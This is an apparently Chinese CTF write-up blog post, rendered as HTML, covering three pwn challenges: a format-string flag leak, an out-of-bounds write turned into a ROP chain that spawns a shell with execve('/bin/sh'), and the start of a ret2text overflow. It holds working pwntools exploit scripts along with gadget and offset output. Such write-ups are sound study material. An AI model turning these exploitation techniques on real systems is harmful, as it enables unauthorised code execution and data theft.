@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="dark">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#080b10">
+  
+  <title>pwn--格式化字符串泄露 · whymm</title>
+  <meta name="description" content="关于 Web、Pwn、Crypto、Reverse、Misc 与区块链的 CTF 解题复盘、工具链和安全研究笔记。">
+  <meta name="author" content="whymm">
+  <meta name="keywords" content="Pwn,格式化字符串,ROP,ret2text,OOB,pwntools,Pwn">
+  <link rel="canonical" href="https://whymm.com.cn/2026/11/20/pwn-fmtstr/">
+  <link rel="alternate" type="application/atom+xml" title="pwn--格式化字符串泄露 · whymm" href="/atom.xml">
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="pwn--格式化字符串泄露 · whymm">
+  <meta property="og:description" content="关于 Web、Pwn、Crypto、Reverse、Misc 与区块链的 CTF 解题复盘、工具链和安全研究笔记。">
+  <meta property="og:site_name" content="whymm">
+  <meta property="og:url" content="https://whymm.com.cn/2026/11/20/pwn-fmtstr/">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:image" content="https://whymm.com.cn/img/og.png">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta property="og:image:alt" content="pwn--格式化字符串泄露 · whymm">
+  
+  <meta property="article:published_time" content="2026-11-20T13:00:00.000Z">
+  <meta property="article:modified_time" content="2026-11-22T09:15:14.835Z">
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="pwn--格式化字符串泄露 · whymm">
+  <meta name="twitter:description" content="关于 Web、Pwn、Crypto、Reverse、Misc 与区块链的 CTF 解题复盘、工具链和安全研究笔记。">
+  <meta name="twitter:image" content="https://whymm.com.cn/img/og.png">
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='8' fill='%23080b10'/%3E%3Cpath d='M8 21l4.2-11 3.8 8.2 3.8-8.2L24 21' stroke='%2335e0a1' stroke-width='2.6' fill='none' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E">
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="stylesheet" href="/css/post.css">
+  <script>
+    (function () {
+      try {
+        var t = localStorage.getItem('whymm-theme');
+        if (t === 'light' || t === 'dark') document.documentElement.setAttribute('data-theme', t);
+      } catch (e) {}
+    })();
+  </script>
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body class="is-post">
+  <div class="bg-grid" aria-hidden="true"></div>
+  <div class="progress" id="progressBar" aria-hidden="true"></div>
+  <header class="site-header">
+  <div class="wrap header-inner">
+    <a class="brand" href="/">
+      <span class="brand-mark" aria-hidden="true">W</span>
+      <span class="brand-name">whymm</span>
+      <span class="brand-caret" aria-hidden="true">_</span>
+    </a>
+
+    <nav class="nav" id="siteNav" aria-label="主导航">
+      
+      <a class="nav-link" href="/">首页</a>
+      
+      <a class="nav-link" href="/archives/">归档</a>
+      
+      <a class="nav-link" href="/categories/">分类</a>
+      
+      <a class="nav-link" href="/tags/">标签</a>
+      
+      <a class="nav-link" href="/about/">关于</a>
+      
+    </nav>
+
+    <div class="header-actions">
+      
+      <button class="icon-btn" id="searchBtn" type="button" aria-label="搜索（Ctrl+K）">
+        <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.5-3.5"/></svg>
+      </button>
+      
+      
+      <button class="icon-btn theme-toggle" id="themeBtn" type="button" aria-label="切换明暗主题">
+        <svg class="i-moon" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.8A9 9 0 1111.2 3a7 7 0 009.8 9.8z"/></svg>
+        <svg class="i-sun" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg>
+      </button>
+      
+      <button class="icon-btn nav-btn" id="navBtn" type="button" aria-label="打开菜单" aria-expanded="false">
+        <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg>
+      </button>
+    </div>
+  </div>
+</header>
+
+  <main class="site-main">
+<article class="post">
+  <div class="wrap post-wrap">
+    <header class="post-header">
+      <div class="breadcrumb">
+        <a href="/">~</a>
+        <span>/</span>
+        
+        <a href="/categories/Pwn/">Pwn</a>
+        <span>/</span>
+        
+        <span class="breadcrumb-current">pwn--格式化字符串泄露</span>
+      </div>
+      <h1 class="post-title">pwn--格式化字符串泄露</h1>
+      <div class="post-meta">
+        <span class="post-meta-item">
+          <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3.5" y="5" width="17" height="16" rx="2.5"/><path d="M8 3v4M16 3v4M3.5 10h17"/></svg>
+          <time datetime="2026-11-20T13:00:00.000Z">2026-11-20</time>
+        </span>
+        <span class="post-meta-item">
+          <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M12 7.5V12l3 2"/></svg>
+          16 分钟阅读
+        </span>
+        <span class="post-meta-item">6087 字</span>
+        
+        
+        <span class="post-meta-item post-author">
+          <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="8" r="3.6"/><path d="M4.5 20c1.2-3.6 4-5.4 7.5-5.4s6.3 1.8 7.5 5.4"/></svg>
+          wu_m1ng
+        </span>
+        
+        
+        <span class="post-meta-item" id="busuanzi_container_page_pv" style="display:none">
+          <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s3.6-6.5 10-6.5S22 12 22 12s-3.6 6.5-10 6.5S2 12 2 12z"/><circle cx="12" cy="12" r="2.6"/></svg>
+          <span id="busuanzi_value_page_pv">0</span> 次阅读
+        </span>
+        
+        
+        <a class="chip chip-cat" href="/categories/Pwn/" style="--c: #ff5c7a">Pwn</a>
+        
+      </div>
+    </header>
+
+    <div class="post-layout">
+      <div class="post-main">
+        
+        <details class="toc-mobile">
+          <summary>目录</summary>
+          <div class="toc-mobile-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn%E2%80%93%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B3%84%E9%9C%B2"><span class="toc-text">pwn–格式化字符串泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn%E2%80%93rop-OOB"><span class="toc-text">pwn–rop+OOB</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn%E2%80%93rop-ret2text"><span class="toc-text">pwn–rop+ret2text</span></a></li></ol></li></ol></div>
+        </details>
+        
+
+        <div class="post-content" id="postContent"><h1 id="pwn–格式化字符串泄露"><a href="#pwn–格式化字符串泄露" class="headerlink" title="pwn–格式化字符串泄露"></a>pwn–格式化字符串泄露</h1><p>拖进ida分析</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> input[<span class="number">256</span>]; <span class="comment">// [rsp+10h] [rbp-1E0h] BYREF</span></span><br><span class="line">__int64 stack_cache; <span class="comment">// [rsp+110h] [rbp-E0h]</span></span><br><span class="line">_QWORD v2[<span class="number">15</span>]; <span class="comment">// [rsp+118h] [rbp-D8h] BYREF</span></span><br><span class="line">_QWORD flag_cache[<span class="number">9</span>]; <span class="comment">// [rsp+190h] [rbp-60h] BYREF</span></span><br><span class="line"><span class="type">size_t</span> flag_len; <span class="comment">// [rsp+1D8h] [rbp-18h]</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *flag; <span class="comment">// [rsp+1E0h] [rbp-10h]</span></span><br><span class="line"><span class="type">size_t</span> i; <span class="comment">// [rsp+1E8h] [rbp-8h]</span></span><br></pre></td></tr></table></figure>
+
+<p>从图中可以看到input的起始位置是rsp+0x10，</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>(dest: flag_cache, src: flag, n: flag_len);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">    v2[i + <span class="number">7</span>] = flag_cache[i];</span><br></pre></td></tr></table></figure>
+
+<p>flag被拷在v2数组的v2[7]到v2[14]中</p>
+<p>而v2的起始位置是rsp+0x118</p>
+<p>又QWORD（Quad Word，四字）：64 位，8 字节。（四倍的 WORD，也就是 x86_64 时代的“标准字长”）</p>
+<p>所以，<code>_QWORD</code> 这个名字，本身就是“4 乘以 2 字节 &#x3D; 8 字节”的意思</p>
+<p>所以v2[7]的起始位置为rsp+0x118 + 7*8 &#x3D; rsp+0x150</p>
+<p>两者的相对距离：0x150 - 0x10 &#x3D; 0x140（320 字节）40 个 QWORD</p>
+<p>再泄露一下寻找input的参数起始地址</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入 &gt; ABCDEFGH%7$p|%8$p</span><br><span class="line">ABCDEFGH(nil)|0x4847464544434241</span><br></pre></td></tr></table></figure>
+
+<p>由图可知input为第8个参数</p>
+<p>原因</p>
+<p><code>printf</code> 这个函数的规矩是：前 6 个参数放在寄存器（口袋）里，从第 7 个参数开始，放在栈（桌子）上。</p>
+<p>当你发 <code>ABCDEFGH%7$p|%8$p</code> 时：</p>
+<ul>
+<li>你输入的字符串 <code>ABCDEFGH</code> 被放在了栈上的某处。</li>
+<li><code>%7$p</code> 告诉 <code>printf</code>：“去桌子上拿第 7 个参数给我看看”。</li>
+<li>结果打印出 <code>(nil)</code>（空指针），说明第 7 个参数不是你的输入。</li>
+<li>接着 <code>%8$p</code> 告诉 <code>printf</code>：“去桌子上拿第 8 个参数给我看看”。</li>
+<li>结果打印出 <code>0x4847464544434241</code>（即 <code>ABCDEFGH</code>）。</li>
+</ul>
+<p>这说明：你输入 <code>ABCDEFGH</code> 的那个位置，恰好排在 <code>printf</code> 所有可变参数的第 8 位。</p>
+<p>所以v2[7]的起始位置为<code>%48$p</code></p>
+<p>故只需要泄露<code>%48$p</code>到 p 这 8 个参数，即可拿到 Flag 字符串存放在栈上的 64 字节内存数据</p>
+<p>再通过清洗与转换（通过 split(b’.’)和 startswith(b’0x’)过滤）<br>十六进制转整数（int(x, 16)）<br>大端转小端（还原内存顺序）（p64(…)）<br>最后再用join拼接</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;110.42.112.160&#x27;</span>, <span class="number">41726</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;输入&gt; &quot;</span>.encode())</span><br><span class="line">io.sendline(<span class="string">b&#x27;.&#x27;</span>.join(<span class="string">f&#x27;%<span class="subst">&#123;i&#125;</span>$p&#x27;</span>.encode() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">55</span>)))</span><br><span class="line">io.sendline(<span class="string">b&#x27;quit&#x27;</span>)</span><br><span class="line">data = io.recvall(timeout=<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;&#x27;</span>.join(p64(<span class="built_in">int</span>(x, <span class="number">16</span>)) <span class="keyword">for</span> x <span class="keyword">in</span> data.split(<span class="string">b&#x27;.&#x27;</span>) <span class="keyword">if</span> x.startswith(<span class="string">b&#x27;0x&#x27;</span>)))</span><br></pre></td></tr></table></figure>
+
+<p>data &#x3D; io.recvall(timeout&#x3D;2)接收数据</p>
+<p>注：该攻击脚本有一部分为ai所写，该题暂时只掌握了大致思路</p>
+<p>所学知识：如何通过泄露来找变量的起始位置</p>
+<p>不足：脚本不会写，很多时候要依靠ai</p>
+<h2 id="pwn–rop-OOB"><a href="#pwn–rop-OOB" class="headerlink" title="pwn–rop+OOB"></a>pwn–rop+OOB</h2><p>先检查保护机制</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xiaowu@localhost:~/Downloads$ pwn checksec calc</span><br><span class="line">[*] &#x27;/home/xiaowu/Downloads/calc&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<p>由图可以看到PIE没开，不用泄露地址</p>
+<p>再拖入IDA</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">calculator</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+8h] [rbp-48h] BYREF</span></span><br><span class="line">  _QWORD v2[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v2, <span class="number">0</span>, <span class="keyword">sizeof</span>(v2));</span><br><span class="line">  <span class="built_in">puts</span>(s: <span class="string">&quot;=== calc_beta ===&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(s: <span class="string">&quot;1. edit&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(s: <span class="string">&quot;2. add&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(s: <span class="string">&quot;3. sub&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(s: <span class="string">&quot;4. mul&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(s: <span class="string">&quot;5. show&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(s: <span class="string">&quot;6. reset&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(s: <span class="string">&quot;7. exit&quot;</span>);</span><br><span class="line">    fwrite(ptr: <span class="string">&quot;&gt; &quot;</span>, size: <span class="number">1u</span>, n: <span class="number">2u</span>, s: <span class="built_in">stdout</span>);</span><br><span class="line">    result = read_decimal(a1: &amp;v1);</span><br><span class="line">    <span class="keyword">if</span> ( result == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1LL</span>:</span><br><span class="line">        edit(a1: v2);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2LL</span>:</span><br><span class="line">        add(a1: v2);</span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+
+<p>发现一个可疑的edit函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">edit</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  fwrite(ptr: <span class="string">&quot;index: &quot;</span>, size: <span class="number">1u</span>, n: <span class="number">7u</span>, s: <span class="built_in">stdout</span>);</span><br><span class="line">  result = read_decimal(a1: &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( result != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    fwrite(ptr: <span class="string">&quot;value (hex): &quot;</span>, size: <span class="number">1u</span>, n: <span class="number">0xDu</span>, s: <span class="built_in">stdout</span>);</span><br><span class="line">    result = read_hex(a1: &amp;v3);</span><br><span class="line">    <span class="keyword">if</span> ( result != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)(a1 + <span class="number">8</span> * v4) = v3;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(s: <span class="string">&quot;updated&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>分析c代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result = read_decimal(a1: &amp;v1);</span><br></pre></td></tr></table></figure>
+
+<p>decimal：十进制</p>
+<p>要先输入一个十进制数否则会break<br>输入1则会调用edit函数</p>
+<p>然后v2这个数组的地址被传入edit函数并被称为a1（rbp-0x40）</p>
+<p>v4同v1</p>
+<p>v3则是要输入一个16进制</p>
+<p>最后来到最为重要的一步</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(_QWORD *)(a1 + <span class="number">8</span> * v4) = v3;</span><br></pre></td></tr></table></figure>
+
+<p>（_QWORD <em>)(a1 + 8 * v4)：一个指向 8 字节内存空间的地址（v2的地址+8</em>v4的值）</p>
+<p>而v3就是这个地址内存放的值</p>
+<p>而我们要把v3的值写到返回地址这个位置去</p>
+<p>接着算偏移：0x40+8&#x3D;72，72&#x2F;8&#x3D;9</p>
+<p>故v4&#x3D;9</p>
+<p>接着再构造rop链</p>
+<p>构造规则</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[pop rax ; ret 地址]  -&gt;  [59]</span><br><span class="line">[pop rdi ; ret 地址]  -&gt;  [/bin/sh 地址]</span><br><span class="line">[pop rsi ; ret 地址]  -&gt;  [0]</span><br><span class="line">[pop rdx ; ret 地址]  -&gt;  [0]</span><br><span class="line">[syscall 地址]</span><br></pre></td></tr></table></figure>
+
+<p>再寻找各个地址</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">xiaowu@localhost:~/Downloads$ ROPgadget --binary calc --only &quot;pop|ret&quot;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0000000000401447 : pop rax ; ret</span><br><span class="line">0x000000000040115d : pop rbp ; ret</span><br><span class="line">0x000000000040144c : pop rdi ; ret</span><br><span class="line">0x0000000000401456 : pop rdx ; ret</span><br><span class="line">0x0000000000401451 : pop rsi ; ret</span><br><span class="line">0x0000000000401016 : ret</span><br><span class="line">0x00000000004011a1 : ret 0x40be</span><br><span class="line">0x00000000004013c3 : ret 0x458b</span><br><span class="line">0x00000000004017c3 : ret 0x8948</span><br><span class="line">0x0000000000401239 : ret 0x8b48</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 10</span><br></pre></td></tr></table></figure>
+
+<p>再找syscall的地址</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xiaowu@localhost:~/Downloads$ ROPgadget --binary calc | grep syscall</span><br><span class="line">0x0000000000401458 : nop ; ud2 ; syscall</span><br><span class="line">0x0000000000401455 : or ebx, dword ptr [rdx - 0x3d] ; nop ; ud2 ; syscall</span><br><span class="line">0x000000000040145b : syscall</span><br><span class="line">0x0000000000401459 : ud2 ; syscall</span><br></pre></td></tr></table></figure>
+
+<p>由图知为0x40145b</p>
+<p>还要bin&#x2F;sh的地址</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xiaowu@localhost:~/Downloads$ ROPgadget --binary calc --string=&quot;/bin/sh&quot;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x0000000000402010 : /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>最后就可以构造我们的rop链了</p>
+<p>最后再让ai帮我们写一下for循环（不会写……）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">34071</span>)</span><br><span class="line">pop_rax = <span class="number">0x401447</span></span><br><span class="line">pop_rdi = <span class="number">0x40144c</span></span><br><span class="line">pop_rsi = <span class="number">0x401451</span></span><br><span class="line">pop_rdx = <span class="number">0x401456</span></span><br><span class="line">syscall = <span class="number">0x40145b</span></span><br><span class="line">binsh   = <span class="number">0x402010</span></span><br><span class="line">rop_chain = [</span><br><span class="line">    pop_rax, <span class="number">0x3b</span>,</span><br><span class="line">    pop_rdi, binsh,</span><br><span class="line">    pop_rsi, <span class="number">0</span>,</span><br><span class="line">    pop_rdx, <span class="number">0</span>,</span><br><span class="line">    syscall</span><br><span class="line">]</span><br><span class="line"><span class="keyword">for</span> i, val <span class="keyword">in</span> <span class="built_in">enumerate</span>(rop_chain):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">9</span> + i).encode())</span><br><span class="line">    p.sendline(<span class="built_in">hex</span>(val)[<span class="number">2</span>:].encode())</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;7&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>关于最后的for循环的解析：</p>
+<ul>
+<li><code>enumerate(rop_chain)</code> 会把这个列表变成“带编号”的形式。每次循环，它给你两个东西：<ul>
+<li><code>i</code>：编号，从 0 开始，第一次是 0，第二次是 1，第三次是 2……</li>
+<li><code>val</code>：当前位置上的值，比如第一次是 <code>pop_rax</code> 的地址，第二次是 <code>0x3b</code>……</li>
+</ul>
+</li>
+</ul>
+<p>所以这个 <code>for</code> 循环的意思就是：挨个取出 ROP 链里的每一个值，同时知道它是第几个。</p>
+<ol start="4">
+<li><code>p.sendline(hex(val)[2:].encode())</code></li>
+</ol>
+<ul>
+<li><p><code>hex(val)</code>：把数字转成带 <code>0x</code> 的十六进制字符串（如 <code>&#39;0x401447&#39;</code>）。</p>
+</li>
+<li><p><code>[2:]</code>：切片，去掉 <code>0x</code> 前缀，变成 <code>&#39;401447&#39;</code>。</p>
+</li>
+<li><p><code>.encode()</code>：转成字节串 <code>b&#39;401447&#39;</code>，然后发送。</p>
+</li>
+<li><p>为什么不能带 <code>0x</code>？因为程序里的 <code>read_hex</code> 只认纯十六进制字符，看到 <code>x</code> 会直接报错退出。</p>
+</li>
+<li><p><code>str(9 + i).encode()</code></p>
+</li>
+<li><p><code>9 + i</code> 是整数（比如 <code>9</code>）。</p>
+</li>
+<li><p><code>str(9)</code> 把它变成字符串 <code>&#39;9&#39;</code>。</p>
+</li>
+<li><p><code>&#39;9&#39;.encode()</code> 把它变成字节串 <code>b&#39;9&#39;</code>。</p>
+</li>
+<li><p>发给程序，程序用 <code>read_decimal</code> 读到数字 9。</p>
+</li>
+</ul>
+<p>所学知识：</p>
+<ul>
+<li>ROP 链的构造</li>
+<li>ROPgadget 的使用</li>
+<li>C 代码的部分分析</li>
+</ul>
+<h2 id="pwn–rop-ret2text"><a href="#pwn–rop-ret2text" class="headerlink" title="pwn–rop+ret2text"></a>pwn–rop+ret2text</h2><p>先检查保护机制</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xiaowu@localhost:~/Downloads$ pwn checksec call</span><br><span class="line">[*] &#x27;/home/xiaowu/Downloads/call&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<p>再拖进IDA</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">take_message</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+0h] [rbp-58h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(s: <span class="string">&quot;(When feel alone)&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(s: <span class="string">&quot;(Just call my name)&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(s: <span class="string">&quot;I will hear your voice -- leave your message after the tone.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(fd: <span class="number">0</span>, buf: &amp;v1, nbytes: <span class="number">0x70u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由最后一行可知发生了溢出</p>
+<p>再算偏移量</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; cyclic -l 0x6161617861616177</span><br><span class="line">Finding cyclic pattern of 4 bytes: b&#x27;waaa&#x27; (hex: 0x77616161)</span><br><span class="line">Found at offset 88</span><br></pre></td></tr></table></figure>
+
+<p>偏移量为88（疑惑：恰好为0x58，没有加rbp本身的8字节）</p>
+<p>读取112字节，有24字节溢出，而且经过ROPgadget搜索找不到binsh字符串和system函数</p>
+<p>故我们要写入binsh字符串找到可写的.bss部分</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.bss:<span class="number">00000000004040</span>A0                 public nameplate</span><br><span class="line">.bss:<span class="number">00000000004040</span>A0 nameplate       db    ? ;</span><br></pre></td></tr></table></figure>
+
+<p>有个（name盘子）盲猜要用这个</p>
+<p>经锤子后得知用2段读即构建2段payload</p>
